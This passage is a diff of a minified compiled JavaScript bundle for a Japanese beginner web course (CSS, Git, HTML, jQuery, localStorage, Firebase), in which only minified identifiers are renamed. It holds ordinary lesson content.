@@ -1,4 +1,4 @@
-import{_ as R}from"./mermaid-vendor-CpAEI21m.js";import{aq as t,ag as e}from"./entry.client-DtWayQEr.js";function y(d){const s={a:"a",br:"br",code:"code",h1:"h1",h2:"h2",h4:"h4",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l}=s;return r||b("Callout"),n||b("Details"),l||b("Infographic"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"CSS入門"}),`
+import{_ as B}from"./mermaid-vendor-CpAEI21m.js";import{aq as t,ag as e}from"./entry.client-DtWayQEr.js";function y(d){const s={a:"a",br:"br",code:"code",h1:"h1",h2:"h2",h4:"h4",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l}=s;return r||b("Callout"),n||b("Details"),l||b("Infographic"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"CSS入門"}),`
 `,e.jsx(n,{summary:"今回のゴール",children:e.jsxs(s.ul,{children:[`
 `,e.jsx(s.li,{children:"CSSとは何かを理解する"}),`
 `,e.jsx(s.li,{children:"CSSの基本ルールを覚える"}),`
@@ -219,7 +219,7 @@ p {
 `,e.jsx(s.h2,{children:"スマートフォン対応"}),`
 `,e.jsx(n,{summary:"レスポンシブデザインとは",children:e.jsx(l,{children:e.jsxs("div",{className:"text-center",children:[e.jsx("div",{className:"inline-flex items-center justify-center w-16 h-16 bg-slate-100 rounded-full mb-4",children:e.jsx("div",{className:"w-8 h-8 text-slate-600",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"})})})}),e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"レスポンシブデザイン"}),e.jsx("div",{className:"text-sm text-slate-600 max-width-md mx-auto",children:e.jsx(s.p,{children:"PCやスマホなど、デバイスの種類や画面のサイズに応じて、自動的にレイアウトを調整することで、どのデバイスでも最適な表示を行うための設計手法"})})]})})}),`
 `,e.jsx(n,{summary:"メディアクエリの基本文法",children:e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"font-medium text-slate-800 mb-3",children:"メディアクエリの基本構文"}),e.jsxs("div",{className:"bg-white p-4 rounded border border-slate-200 font-mono text-sm mb-4",children:[e.jsx("div",{className:"text-blue-600",children:"@media"}),e.jsx("div",{className:"ml-2 text-green-600",children:"screen"}),e.jsx("div",{className:"ml-2 text-slate-800",children:"and"}),e.jsx("div",{className:"ml-2 text-orange-600",children:"(max-width: 768px)"}),e.jsx("div",{className:"text-slate-800",children:"{"}),e.jsx("div",{className:"ml-4 text-slate-600",children:"/* スマホ用のスタイル */"}),e.jsx("div",{className:"text-slate-800",children:"}"})]}),e.jsxs("div",{className:"space-y-3 text-sm",children:[e.jsxs("div",{className:"flex items-start",children:[e.jsx("div",{className:"w-3 h-3 bg-blue-600 rounded mr-2 mt-1"}),e.jsxs("div",{children:[e.jsx("span",{className:"font-medium text-slate-800",children:"@media:"}),e.jsx("span",{className:"text-slate-600 ml-1",children:"メディアクエリを開始するキーワード"})]})]}),e.jsxs("div",{className:"flex items-start",children:[e.jsx("div",{className:"w-3 h-3 bg-green-600 rounded mr-2 mt-1"}),e.jsxs("div",{children:[e.jsx("span",{className:"font-medium text-slate-800",children:"screen:"}),e.jsx("span",{className:"text-slate-600 ml-1",children:"画面表示を対象とする"})]})]}),e.jsxs("div",{className:"flex items-start",children:[e.jsx("div",{className:"w-3 h-3 bg-orange-600 rounded mr-2 mt-1"}),e.jsxs("div",{children:[e.jsx("span",{className:"font-medium text-slate-800",children:"条件:"}),e.jsx("span",{className:"text-slate-600 ml-1",children:"max-width（〜以下）、min-width（〜以上）"})]})]})]})]})})}),`
-`,e.jsx(n,{summary:"代表的なブレイクポイント",children:e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-center p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-slate-600 mr-3",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"スマートフォン"}),e.jsx("div",{className:"text-sm text-slate-700",children:"〜 768px"})]})]}),e.jsxs("div",{className:"flex items-center p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-slate-600 mr-3",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M7 4V2a1 1 0 011-1h8a1 1 0 011 1v2m0 0V1a1 1 0 011-1h2a1 1 0 011 1v18a1 1 0 01-1 1H4a1 1 0 01-1-1V3a1 1 0 011-1h2a1 1 0 011 1v3"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"タブレット"}),e.jsx("div",{className:"text-sm text-slate-700",children:"577px 〜 768px"})]})]}),e.jsxs("div",{className:"flex items-center p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-slate-600 mr-3",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"PC・デスクトップ"}),e.jsx("div",{className:"text-sm text-slate-700",children:"769px 〜"})]})]})]})})})]})}function H(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(y,{...d})}):y(d)}function b(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const B=Object.freeze(Object.defineProperty({__proto__:null,default:H},Symbol.toStringTag,{value:"Module"}));function k(d){const s={h2:"h2",li:"li",ul:"ul",...t(),...d.components},{Details:r,LinkCard:n}=s;return r||w("Details"),n||w("LinkCard"),e.jsxs(e.Fragment,{children:[e.jsx(s.h2,{children:"Git / GitHub 入門"}),`
+`,e.jsx(n,{summary:"代表的なブレイクポイント",children:e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-center p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-slate-600 mr-3",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"スマートフォン"}),e.jsx("div",{className:"text-sm text-slate-700",children:"〜 768px"})]})]}),e.jsxs("div",{className:"flex items-center p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-slate-600 mr-3",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M7 4V2a1 1 0 011-1h8a1 1 0 011 1v2m0 0V1a1 1 0 011-1h2a1 1 0 011 1v18a1 1 0 01-1 1H4a1 1 0 01-1-1V3a1 1 0 011-1h2a1 1 0 011 1v3"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"タブレット"}),e.jsx("div",{className:"text-sm text-slate-700",children:"577px 〜 768px"})]})]}),e.jsxs("div",{className:"flex items-center p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-slate-600 mr-3",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"PC・デスクトップ"}),e.jsx("div",{className:"text-sm text-slate-700",children:"769px 〜"})]})]})]})})})]})}function O(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(y,{...d})}):y(d)}function b(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const W=Object.freeze(Object.defineProperty({__proto__:null,default:O},Symbol.toStringTag,{value:"Module"}));function k(d){const s={h2:"h2",li:"li",ul:"ul",...t(),...d.components},{Details:r,LinkCard:n}=s;return r||w("Details"),n||w("LinkCard"),e.jsxs(e.Fragment,{children:[e.jsx(s.h2,{children:"Git / GitHub 入門"}),`
 `,e.jsx(r,{summary:"今回のゴール",children:e.jsxs(s.ul,{children:[`
 `,e.jsx(s.li,{children:"Git と GitHub とは何かを理解する"}),`
 `,e.jsx(s.li,{children:"GitHub にアップロードできる設定を完了する"}),`
@@ -227,7 +227,7 @@ p {
 `,e.jsx(s.h2,{children:"事前準備"}),`
 `,e.jsx(n,{url:"https://cha1ra.notion.site/Git-GitHub-5901d9d9aea74ab79ffeadec5ef89633"}),`
 `,e.jsx(s.h2,{children:"Git / GitHub 講義資料"}),`
-`,e.jsx(n,{url:"https://yubase-inc.notion.site/Git-GitHub-e776fdb10bee418aa33321b94f8ccdf6?source=copy_link"})]})}function W(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(k,{...d})}):k(d)}function w(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const V=Object.freeze(Object.defineProperty({__proto__:null,default:W},Symbol.toStringTag,{value:"Module"}));function L(d){const s={a:"a",br:"br",code:"code",h1:"h1",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l}=s;return r||N("Callout"),n||N("Details"),l||N("Infographic"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"HTML入門"}),`
+`,e.jsx(n,{url:"https://yubase-inc.notion.site/Git-GitHub-e776fdb10bee418aa33321b94f8ccdf6?source=copy_link"})]})}function R(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(k,{...d})}):k(d)}function w(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const z=Object.freeze(Object.defineProperty({__proto__:null,default:R},Symbol.toStringTag,{value:"Module"}));function L(d){const s={a:"a",br:"br",code:"code",h1:"h1",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l}=s;return r||N("Callout"),n||N("Details"),l||N("Infographic"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"HTML入門"}),`
 `,e.jsx(n,{summary:"学習目標・ゴール",children:e.jsxs(s.ul,{children:[`
 `,e.jsx(s.li,{children:"HTMLの役割と基本概念を理解する"}),`
 `,e.jsx(s.li,{children:"VSCodeを使ったHTML開発の基本操作を習得する"}),`
@@ -480,7 +480,7 @@ AIの発展は社会に大きな変革をもたらす可能性がある。
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"SEO向上"}),": 検索エンジンが内容を理解しやすくなる"]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"アクセシビリティ向上"}),": スクリーンリーダーなどの支援技術が内容を正しく解釈できる"]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"保守性向上"}),": コードの構造が明確になり、他の開発者が理解しやすくなる"]}),`
-`]})})]})]})}function F(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(L,{...d})}):L(d)}function N(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const z=Object.freeze(Object.defineProperty({__proto__:null,default:F},Symbol.toStringTag,{value:"Module"}));function S(d){const s={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h4:"h4",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,LinkCard:i,Mermaid:c}=s;return r||a("Callout"),n||a("Details"),l||a("Infographic"),i||a("LinkCard"),c||a("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"AI時代のプログラミング学習"}),`
+`]})})]})]})}function V(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(L,{...d})}):L(d)}function N(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const F=Object.freeze(Object.defineProperty({__proto__:null,default:V},Symbol.toStringTag,{value:"Module"}));function S(d){const s={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h4:"h4",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,LinkCard:i,Mermaid:c}=s;return r||a("Callout"),n||a("Details"),l||a("Infographic"),i||a("LinkCard"),c||a("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"AI時代のプログラミング学習"}),`
 `,e.jsx(n,{summary:"今回のゴール",children:e.jsxs(s.ul,{children:[`
 `,e.jsx(s.li,{children:"AI時代になぜプログラミングを学ぶ必要があるかを理解する"}),`
 `]})}),`
@@ -566,7 +566,7 @@ graph TD
 なぜ最初の書き方を教えたのか理由も教えてください。
 `})}),e.jsx(r,{type:"tip",title:"実践のコツ",children:e.jsx(s.p,{children:"授業中の演習は、講師から特別な指示がない場合、まずは生成AIを使わずに取り組んでみましょう！数学の教科書を読んだだけでは数学の問題を解けないのと同じで、自分で手を動かす経験が重要です。"})})]}),`
 `,e.jsx(s.h2,{children:"まとめ"}),`
-`,e.jsxs(n,{summary:"AI時代に求められるプログラミング力",children:[e.jsx(l,{children:e.jsx("div",{className:"bg-slate-50 p-6 rounded",children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"space-y-4",children:[e.jsx("h4",{className:"font-bold text-slate-800 text-center",children:"従来重要だったスキル"}),e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-center p-3 bg-white rounded border",children:[e.jsx("div",{className:"w-2 h-2 bg-slate-400 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-600",children:"記法の暗記"})]}),e.jsxs("div",{className:"flex items-center p-3 bg-white rounded border",children:[e.jsx("div",{className:"w-2 h-2 bg-slate-400 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-600",children:"アルゴリズム実装"})]}),e.jsxs("div",{className:"flex items-center p-3 bg-white rounded border",children:[e.jsx("div",{className:"w-2 h-2 bg-slate-400 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-600",children:"全てを一から書く力"})]})]})]}),e.jsxs("div",{className:"space-y-4",children:[e.jsx("h4",{className:"font-bold text-slate-800 text-center",children:"AI時代に重要なスキル"}),e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-center p-3 bg-blue-50 rounded border-2 border-blue-200",children:[e.jsx("div",{className:"w-2 h-2 bg-blue-500 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-700 font-medium",children:"要件を明確に伝える力"})]}),e.jsxs("div",{className:"flex items-center p-3 bg-green-50 rounded border-2 border-green-200",children:[e.jsx("div",{className:"w-2 h-2 bg-green-500 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-700 font-medium",children:"コードを読んで理解する力"})]}),e.jsxs("div",{className:"flex items-center p-3 bg-orange-50 rounded border-2 border-orange-200",children:[e.jsx("div",{className:"w-2 h-2 bg-orange-500 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-700 font-medium",children:"適切な技術判断をする力"})]}),e.jsxs("div",{className:"flex items-center p-3 bg-purple-50 rounded border-2 border-purple-200",children:[e.jsx("div",{className:"w-2 h-2 bg-purple-500 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-700 font-medium",children:"エラーを読んで対処する力"})]})]})]})]})})}),e.jsxs(r,{type:"success",title:"学習の心構え",children:[e.jsx(s.p,{children:"プログラミングの知識は、AI時代においてより重要になります。それは「コードを書くため」ではなく、「AIと効果的にコミュニケーションするため」「適切な判断をするため」です。"}),e.jsx(s.p,{children:"手を動かして体験的に学んだ知識こそが、AI時代の最強の武器になります！"})]})]})]})}function U(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(S,{...d})}):S(d)}function a(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const J=Object.freeze(Object.defineProperty({__proto__:null,default:U},Symbol.toStringTag,{value:"Module"}));function M(d){const s={h1:"h1",h2:"h2",li:"li",ul:"ul",...t(),...d.components},{Details:r,LinkCard:n}=s;return r||E("Details"),n||E("LinkCard"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"イントロダクション・環境設定"}),`
+`,e.jsxs(n,{summary:"AI時代に求められるプログラミング力",children:[e.jsx(l,{children:e.jsx("div",{className:"bg-slate-50 p-6 rounded",children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"space-y-4",children:[e.jsx("h4",{className:"font-bold text-slate-800 text-center",children:"従来重要だったスキル"}),e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-center p-3 bg-white rounded border",children:[e.jsx("div",{className:"w-2 h-2 bg-slate-400 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-600",children:"記法の暗記"})]}),e.jsxs("div",{className:"flex items-center p-3 bg-white rounded border",children:[e.jsx("div",{className:"w-2 h-2 bg-slate-400 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-600",children:"アルゴリズム実装"})]}),e.jsxs("div",{className:"flex items-center p-3 bg-white rounded border",children:[e.jsx("div",{className:"w-2 h-2 bg-slate-400 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-600",children:"全てを一から書く力"})]})]})]}),e.jsxs("div",{className:"space-y-4",children:[e.jsx("h4",{className:"font-bold text-slate-800 text-center",children:"AI時代に重要なスキル"}),e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-center p-3 bg-blue-50 rounded border-2 border-blue-200",children:[e.jsx("div",{className:"w-2 h-2 bg-blue-500 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-700 font-medium",children:"要件を明確に伝える力"})]}),e.jsxs("div",{className:"flex items-center p-3 bg-green-50 rounded border-2 border-green-200",children:[e.jsx("div",{className:"w-2 h-2 bg-green-500 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-700 font-medium",children:"コードを読んで理解する力"})]}),e.jsxs("div",{className:"flex items-center p-3 bg-orange-50 rounded border-2 border-orange-200",children:[e.jsx("div",{className:"w-2 h-2 bg-orange-500 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-700 font-medium",children:"適切な技術判断をする力"})]}),e.jsxs("div",{className:"flex items-center p-3 bg-purple-50 rounded border-2 border-purple-200",children:[e.jsx("div",{className:"w-2 h-2 bg-purple-500 rounded-full mr-3"}),e.jsx("span",{className:"text-sm text-slate-700 font-medium",children:"エラーを読んで対処する力"})]})]})]})]})})}),e.jsxs(r,{type:"success",title:"学習の心構え",children:[e.jsx(s.p,{children:"プログラミングの知識は、AI時代においてより重要になります。それは「コードを書くため」ではなく、「AIと効果的にコミュニケーションするため」「適切な判断をするため」です。"}),e.jsx(s.p,{children:"手を動かして体験的に学んだ知識こそが、AI時代の最強の武器になります！"})]})]})]})}function J(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(S,{...d})}):S(d)}function a(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const U=Object.freeze(Object.defineProperty({__proto__:null,default:J},Symbol.toStringTag,{value:"Module"}));function M(d){const s={h1:"h1",h2:"h2",li:"li",ul:"ul",...t(),...d.components},{Details:r,LinkCard:n}=s;return r||C("Details"),n||C("LinkCard"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"イントロダクション・環境設定"}),`
 `,e.jsx(r,{summary:"今回のゴール",children:e.jsxs(s.ul,{children:[`
 `,e.jsx(s.li,{children:"Webアプリケーションの仕組みを理解する"}),`
 `,e.jsx(s.li,{children:"環境構築を行う"}),`
@@ -577,7 +577,7 @@ graph TD
 `,e.jsx(s.h2,{children:"環境構築"}),`
 `,e.jsx(n,{url:"https://yubase-inc.notion.site/1f8d6b7390d280fb8637f0ec39332bda?source=copy_link"}),`
 `,e.jsx(s.h2,{children:"プログラミング・AIとの向き合い方"}),`
-`,e.jsx(n,{url:"https://yubase-inc.notion.site/AI-1f8d6b7390d280e59f05ec600831fa31?source=copy_link"})]})}function G(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(M,{...d})}):M(d)}function E(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const Q=Object.freeze(Object.defineProperty({__proto__:null,default:G},Symbol.toStringTag,{value:"Module"}));function C(d){const s={a:"a",br:"br",code:"code",h1:"h1",h2:"h2",h4:"h4",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,LinkCard:i,Mermaid:c}=s;return r||x("Callout"),n||x("Details"),l||x("Infographic"),i||x("LinkCard"),c||x("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#01 JavaScript - JavaScript入門・jQuery"}),`
+`,e.jsx(n,{url:"https://yubase-inc.notion.site/AI-1f8d6b7390d280e59f05ec600831fa31?source=copy_link"})]})}function G(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(M,{...d})}):M(d)}function C(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const Q=Object.freeze(Object.defineProperty({__proto__:null,default:G},Symbol.toStringTag,{value:"Module"}));function $(d){const s={a:"a",br:"br",code:"code",h1:"h1",h2:"h2",h4:"h4",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,LinkCard:i,Mermaid:c}=s;return r||x("Callout"),n||x("Details"),l||x("Infographic"),i||x("LinkCard"),c||x("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#01 JavaScript - JavaScript入門・jQuery"}),`
 `,e.jsx(n,{summary:"今回のゴール",children:e.jsxs(s.ul,{children:[`
 `,e.jsxs(s.li,{children:["JavaScriptの使い方を理解する",`
 `,e.jsxs(s.ul,{children:[`
@@ -1285,7 +1285,7 @@ $('#checkbox').prop('checked', false); // チェックを外す
 `,e.jsxs(n,{summary:"よくあるエラー",children:[e.jsx(r,{type:"error",title:"Uncaught SyntaxError",children:e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"原因"}),`: 文法エラー（括弧の閉じ忘れ、セミコロン忘れなど）
 `,e.jsx(s.strong,{children:"対処"}),": エラーが示す行番号の前後を確認"]})}),e.jsx(r,{type:"error",title:"Uncaught ReferenceError",children:e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"原因"}),`: 宣言していない変数を使用
 `,e.jsx(s.strong,{children:"対処"}),": 変数名のスペルミス、宣言忘れを確認"]})}),e.jsx(r,{type:"error",title:"Uncaught TypeError",children:e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"原因"}),`: 型が合わない操作（nullのプロパティにアクセスなど）
-`,e.jsx(s.strong,{children:"対処"}),": 変数の中身をconsole.logで確認"]})})]})]})}function q(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(C,{...d})}):C(d)}function x(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const K=Object.freeze(Object.defineProperty({__proto__:null,default:q},Symbol.toStringTag,{value:"Module"}));function $(d){const s={a:"a",br:"br",code:"code",h1:"h1",h2:"h2",h4:"h4",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,Mermaid:i}=s;return r||o("Callout"),n||o("Details"),l||o("Infographic"),i||o("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#02 JavaScript - 配列・for文・localStorage"}),`
+`,e.jsx(s.strong,{children:"対処"}),": 変数の中身をconsole.logで確認"]})})]})]})}function K(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx($,{...d})}):$(d)}function x(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const q=Object.freeze(Object.defineProperty({__proto__:null,default:K},Symbol.toStringTag,{value:"Module"}));function E(d){const s={a:"a",br:"br",code:"code",h1:"h1",h2:"h2",h4:"h4",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,Mermaid:i}=s;return r||o("Callout"),n||o("Details"),l||o("Infographic"),i||o("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#02 JavaScript - 配列・for文・localStorage"}),`
 `,e.jsx(n,{summary:"今回のゴール",children:e.jsxs(s.ul,{children:[`
 `,e.jsxs(s.li,{children:["JavaScriptの文法を理解する",`
 `,e.jsxs(s.ul,{children:[`
@@ -1667,7 +1667,7 @@ for (let i = 0; i < localStorage.length; i++) {
     const html = \`<tr><th>\${key}</th><td>\${value}</td></tr>\`;
     $('#list').append(html);
 }
-`})})})]})}function Y(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx($,{...d})}):$(d)}function o(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const X=Object.freeze(Object.defineProperty({__proto__:null,default:Y},Symbol.toStringTag,{value:"Module"}));function _(d){const s={a:"a",br:"br",code:"code",h1:"h1",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,LinkCard:i}=s;return r||h("Callout"),n||h("Details"),l||h("Infographic"),i||h("LinkCard"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#03 JavaScript - オブジェクト・Firebase"}),`
+`})})})]})}function X(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(E,{...d})}):E(d)}function o(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const Y=Object.freeze(Object.defineProperty({__proto__:null,default:X},Symbol.toStringTag,{value:"Module"}));function _(d){const s={a:"a",br:"br",code:"code",h1:"h1",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,LinkCard:i}=s;return r||h("Callout"),n||h("Details"),l||h("Infographic"),i||h("LinkCard"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#03 JavaScript - オブジェクト・Firebase"}),`
 `,e.jsx(n,{summary:"今回のゴール",children:e.jsxs(s.ul,{children:[`
 `,e.jsx(s.li,{children:"オブジェクトの概念と使い方を理解する"}),`
 `,e.jsx(s.li,{children:"Firebaseを使った外部サービスへのデータ保存方法を体験する"}),`
@@ -1987,7 +1987,7 @@ onChildRemoved(messagesRef, function (data) {
     const key = data.key; // ユニークIDを取得
     $(\`#\${key}\`).remove(); // メッセージの表示を削除
 });
-`})}),e.jsx(r,{type:"info",title:"イベント委譲の活用",children:e.jsxs(s.p,{children:[e.jsx(s.code,{children:"$('body').on('click', '.message-item', function () {...})"}),"は",e.jsx(s.strong,{children:"イベント委譲"}),"という手法です。動的に追加される要素（メッセージ）に対してもクリックイベントが適用されます。"]})}),e.jsx(r,{type:"warning",title:"削除機能の注意点",children:e.jsx(s.p,{children:"この実装では誰でも他人のメッセージを削除できてしまいます。実際のアプリでは、メッセージの作成者のみが削除できるような制御が必要です。"})})]})]})}function Z(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(_,{...d})}):_(d)}function h(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const ee=Object.freeze(Object.defineProperty({__proto__:null,default:Z},Symbol.toStringTag,{value:"Module"}));function T(d){const s={a:"a",br:"br",code:"code",h1:"h1",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,LinkCard:i}=s;return 